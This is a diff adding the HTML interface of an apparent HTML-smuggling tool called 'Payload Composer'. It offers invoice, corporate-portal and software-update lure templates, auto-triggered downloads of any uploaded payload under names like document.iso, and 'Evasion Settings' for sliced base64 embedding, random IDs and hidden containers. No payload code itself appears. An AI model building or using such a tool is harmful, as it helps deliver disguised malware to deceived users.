@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Composer</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- subtle grid overlay -->
+    <div class="grid-bg"></div>
+
+    <!-- ===== HEADER ===== -->
+    <header class="app-header">
+        <div class="header-inner">
+            <div class="brand">
+                <span class="brand-icon">&#9670;</span>
+                <span class="brand-text">Payload Composer</span>
+            </div>
+            <div class="header-status" id="headerStatus">
+                <span class="status-dot" id="statusDot"></span>
+                <span class="status-label" id="statusLabel">Ready</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MAIN LAYOUT ===== -->
+    <main class="app-main">
+
+        <!-- ===== LEFT PANEL: Configuration ===== -->
+        <section class="panel panel-config" id="configPanel">
+            <div class="panel-header">
+                <h2 class="panel-title">Configuration</h2>
+                <span class="panel-badge">Step 1</span>
+            </div>
+            <div class="panel-body">
+
+                <!-- Template Section -->
+                <fieldset class="config-group">
+                    <legend class="config-legend">
+                        <span class="legend-num">01</span> HTML Template
+                    </legend>
+
+                    <div class="template-tabs" role="tablist">
+                        <button class="template-tab active" data-tab="preset" role="tab" aria-selected="true">Presets</button>
+                        <button class="template-tab" data-tab="custom" role="tab" aria-selected="false">Upload</button>
+                        <button class="template-tab" data-tab="raw" role="tab" aria-selected="false">Paste HTML</button>
+                    </div>
+
+                    <!-- Preset Templates -->
+                    <div class="template-panel active" id="tabPreset">
+                        <div class="preset-grid">
+                            <label class="preset-card" data-preset="minimal">
+                                <input type="radio" name="presetTemplate" value="minimal" checked>
+                                <div class="preset-preview">
+                                    <div class="preset-thumb preset-minimal">
+                                        <span>Download Page</span>
+                                    </div>
+                                    <span class="preset-name">Simple</span>
+                                </div>
+                            </label>
+                            <label class="preset-card" data-preset="corp">
+                                <input type="radio" name="presetTemplate" value="corp">
+                                <div class="preset-preview">
+                                    <div class="preset-thumb preset-corp-thumb">
+                                        <span>Secure Portal</span>
+                                    </div>
+                                    <span class="preset-name">Corporate</span>
+                                </div>
+                            </label>
+                            <label class="preset-card" data-preset="invoice">
+                                <input type="radio" name="presetTemplate" value="invoice">
+                                <div class="preset-preview">
+                                    <div class="preset-thumb preset-invoice-thumb">
+                                        <span>Statement</span>
+                                    </div>
+                                    <span class="preset-name">Invoice</span>
+                                </div>
+                            </label>
+                            <label class="preset-card" data-preset="update">
+                                <input type="radio" name="presetTemplate" value="update">
+                                <div class="preset-preview">
+                                    <div class="preset-thumb preset-update-thumb">
+                                        <span>Software Update</span>
+                                    </div>
+                                    <span class="preset-name">Installer</span>
+                                </div>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Custom HTML Upload -->
+                    <div class="template-panel" id="tabCustom" style="display:none;">
+                        <div class="drop-zone" id="htmlDropZone">
+                            <input type="file" id="htmlFileInput" accept=".html,.htm,.txt" hidden>
+                            <div class="drop-zone-content">
+                                <svg class="drop-icon" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><polyline points="9 15 12 18 15 15"/></svg>
+                                <p class="drop-text">
+                                    <strong>Drop HTML template here</strong>
+                                    <span>or click to browse</span>
+                                </p>
+                                <p class="drop-hint">.html, .htm, .txt accepted</p>
+                            </div>
+                        </div>
+                        <div class="custom-html-status" id="customHtmlStatus" style="display:none;">
+                            <span class="file-indicator" id="customHtmlName"></span>
+                            <button class="btn-sm btn-ghost" id="clearCustomHtml">&#10005;</button>
+                        </div>
+
+                        <!-- Placeholder markers info -->
+                        <div class="info-box">
+                            <p class="info-title">Template Markers</p>
+                            <p>Use these in your custom HTML to control placement:</p>
+                            <code>{{DOWNLOAD_TRIGGER}}</code> &mdash; where the download button appears<br>
+                            <code>{{COUNTDOWN}}</code> &mdash; countdown timer display<br>
+                            <code>{{SPINNER}}</code> &mdash; loading spinner<br>
+                            <code>{{PAYLOAD_NAME}}</code> &mdash; injected filename
+                        </div>
+                    </div>
+
+                    <!-- Custom HTML textarea -->
+                    <div class="template-panel" id="tabRaw" style="display:none;">
+                        <textarea id="rawHtmlInput" class="code-textarea" placeholder="Paste your HTML template here..." spellcheck="false"></textarea>
+                        <div class="info-box" style="margin-top:0.8rem;">
+                            <p class="info-title">Template Markers</p>
+                            <p style="font-size:0.82rem;">
+                                <code>{{DOWNLOAD_TRIGGER}}</code> <code>{{COUNTDOWN}}</code> <code>{{SPINNER}}</code> <code>{{PAYLOAD_NAME}}</code>
+                            </p>
+                        </div>
+                    </div>
+                </fieldset>
+
+                <!-- Payload Section -->
+                <fieldset class="config-group">
+                    <legend class="config-legend">
+                        <span class="legend-num">02</span> Payload
+                    </legend>
+                    <div class="drop-zone drop-zone-payload" id="payloadDropZone">
+                        <input type="file" id="payloadFileInput" hidden>
+                        <div class="drop-zone-content">
+                            <svg class="drop-icon" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
+                            <p class="drop-text">
+                                <strong>Drop payload file here</strong>
+                                <span>or click to browse</span>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="payload-status" id="payloadStatus" style="display:none;">
+                        <div class="payload-info-row">
+                            <span class="file-indicator" id="payloadName"></span>
+                            <button class="btn-sm btn-ghost" id="clearPayload">&#10005;</button>
+                        </div>
+                        <div class="payload-meta">
+                            <span id="payloadSize"></span>
+                            <span class="meta-sep">|</span>
+                            <span id="payloadType"></span>
+                        </div>
+                    </div>
+                </fieldset>
+
+                <!-- Download Config -->
+                <fieldset class="config-group">
+                    <legend class="config-legend">
+                        <span class="legend-num">03</span> Download Configuration
+                    </legend>
+
+                    <div class="form-row">
+                        <label class="form-label" for="downloadName">Output filename</label>
+                        <input type="text" id="downloadName" class="form-input mono" value="document.iso" spellcheck="false">
+                        <span class="form-hint">Use .exe, .iso, .zip, .pdf, .docx — any extension</span>
+                    </div>
+
+                    <div class="form-row">
+                        <label class="form-label">Download mode</label>
+                        <div class="radio-group" id="downloadModeGroup">
+                            <label class="radio-card">
+                                <input type="radio" name="downloadMode" value="auto" checked>
+                                <span class="radio-indicator"></span>
+                                <span class="radio-label">Auto</span>
+                                <span class="radio-desc">Triggers automatically</span>
+                            </label>
+                            <label class="radio-card">
+                                <input type="radio" name="downloadMode" value="button">
+                                <span class="radio-indicator"></span>
+                                <span class="radio-label">Button</span>
+                                <span class="radio-desc">User must click</span>
+                            </label>
+                            <label class="radio-card">
+                                <input type="radio" name="downloadMode" value="both">
+                                <span class="radio-indicator"></span>
+                                <span class="radio-label">Both</span>
+                                <span class="radio-desc">Auto + manual fallback</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="form-row" id="autoDelayRow">
+                        <label class="form-label" for="autoDelay">Auto-trigger delay <span class="label-unit">(seconds)</span></label>
+                        <input type="number" id="autoDelay" class="form-input mono" value="2.5" min="0" max="30" step="0.1">
+                    </div>
+
+                    <div class="form-row" id="countdownRow">
+                        <label class="form-label" for="countdownDuration">Countdown duration <span class="label-unit">(seconds, 0 = disabled)</span></label>
+                        <input type="number" id="countdownDuration" class="form-input mono" value="300" min="0" max="3600" step="1">
+                    </div>
+                </fieldset>
+
+                <!-- Evasion Settings -->
+                <fieldset class="config-group">
+                    <legend class="config-legend">
+                        <span class="legend-num">04</span> Embedding
+                    </legend>
+
+                    <div class="form-row">
+                        <label class="form-label" for="sliceSize">Slice size <span class="label-unit">(chars per chunk)</span></label>
+                        <input type="number" id="sliceSize" class="form-input mono" value="80" min="40" max="200" step="1">
+                    </div>
+
+                    <div class="form-row">
+                        <label class="form-label">Obfuscation layers</label>
+                        <div class="checkbox-list">
+                            <label class="check-row">
+                                <input type="checkbox" id="optSlicedPayload" checked>
+                                <span class="check-box"></span>
+                                <span>Sliced base64 payload</span>
+                            </label>
+                            <label class="check-row">
+                                <input type="checkbox" id="optRandomIds" checked>
+                                <span class="check-box"></span>
+                                <span>Randomized element IDs</span>
+                            </label>
+                            <label class="check-row">
+                                <input type="checkbox" id="optHiddenContainer" checked>
+                                <span class="check-box"></span>
+                                <span>Hidden SVG container</span>
+                            </label>
+                            <label class="check-row check-row-disabled">
+                                <input type="checkbox" id="optCharCodeEval" disabled>
+                                <span class="check-box check-box-disabled"></span>
+                                <span class="strikethrough">CharCode eval wrapping</span>
+                                <span class="tag-broken">broken</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="form-row" id="idLengthRow">
+                        <label class="form-label" for="idLength">Random ID length</label>
+                        <input type="number" id="idLength" class="form-input mono" value="9" min="6" max="20" step="1">
+                    </div>
+                </fieldset>
+            </div>
+        </section>
+
+        <!-- ===== RIGHT PANEL: Preview & Output ===== -->
+        <section class="panel panel-output" id="outputPanel">
+            <div class="panel-header">
+                <h2 class="panel-title">Output</h2>
+                <span class="panel-badge">Step 2</span>
+            </div>
+            <div class="panel-body">
+
+                <!-- Stats Bar -->
+                <div class="stats-bar" id="statsBar">
+                    <div class="stat">
+                        <span class="stat-value" id="statPayloadSize">--</span>
+                        <span class="stat-label">Payload</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-value" id="statSlices">--</span>
+                        <span class="stat-label">Slices</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-value" id="statOutputSize">--</span>
+                        <span class="stat-label">Output</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-value" id="statEmbedRatio">--</span>
+                        <span class="stat-label">Ratio</span>
+                    </div>
+                </div>
+
+                <!-- Generate -->
+                <div class="generate-area">
+                    <button id="btnGenerate" class="btn-generate" disabled>
+                        <span class="btn-generate-icon">&#9654;</span>
+                        <span class="btn-generate-text">Compose</span>
+                    </button>
+                    <p class="generate-hint" id="generateHint">Upload a payload and configure options above</p>
+                </div>
+
+                <!-- Preview Tabs -->
+                <div class="output-tabs" id="outputTabs" style="display:none;">
+                    <button class="output-tab active" data-output="preview">Live Preview</button>
+                    <button class="output-tab" data-output="source">HTML Source</button>
+                    <button class="output-tab" data-output="logs">Build Log</button>
+                </div>
+
+                <!-- Preview Frame -->
+                <div class="preview-container" id="previewContainer" style="display:none;">
+                    <div class="preview-toolbar">
+                        <span class="preview-url">generated.html</span>
+                        <div class="preview-actions">
+                            <button class="btn-sm btn-ghost" id="btnRefresh" title="Refresh preview">&#8635;</button>
+                            <button class="btn-sm btn-ghost" id="btnOpenPreview" title="Open in new tab">&#8599;</button>
+                        </div>
+                    </div>
+                    <iframe id="previewFrame" class="preview-frame" sandbox="allow-scripts allow-downloads allow-same-origin"></iframe>
+                </div>
+
+                <!-- Source View -->
+                <div class="source-container" id="sourceContainer" style="display:none;">
+                    <div class="source-toolbar">
+                        <span class="source-lines" id="sourceLines">0 lines</span>
+                        <div class="source-actions">
+                            <button class="btn-sm btn-ghost" id="btnCopySource">Copy</button>
+                            <button class="btn-sm btn-primary" id="btnDownloadOutput">
+                                <span>&#8615;</span> Download .html
+                            </button>
+                        </div>
+                    </div>
+                    <pre class="source-view"><code id="sourceCode"></code></pre>
+                </div>
+
+                <!-- Build Log -->
+                <div class="log-container" id="logContainer" style="display:none;">
+                    <div class="log-inner" id="logInner"></div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- ===== MODAL ===== -->
+    <div class="modal-overlay" id="modalOverlay" style="display:none;">
+        <div class="modal">
+            <div class="modal-header">
+                <h3 id="modalTitle">Notice</h3>
+            </div>
+            <div class="modal-body" id="modalBody"></div>
+            <div class="modal-footer" id="modalFooter"></div>
+        </div>
+    </div>
+
+    <script src="js/app.js"></script>
+</body>
+</html>
